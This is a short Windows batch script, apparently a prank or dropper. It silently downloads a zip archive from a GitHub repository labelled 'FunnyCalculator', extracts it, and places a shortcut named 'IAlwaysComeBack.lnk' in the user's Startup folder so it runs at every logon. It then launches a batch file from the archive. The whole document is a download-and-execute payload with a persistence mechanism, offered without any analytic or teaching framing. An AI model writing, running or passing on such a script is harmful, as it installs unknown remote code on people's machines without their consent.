@echo off

cd "C:\Users\%USERNAME%\"
curl.exe -s -L -O "https://github.com/MyelinLennox/FunnyCalculator/raw/refs/heads/main/EatMyShortz.zip"
tar -xf EatMyShortz.zip
mv "EatMyShortz.zip\IAlwaysComeBack.lnk" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IAlwaysComeBack.lnk"
start "C:\Users\%USERNAME%\EatMyShortz\IAlwaysComeBack.bat"
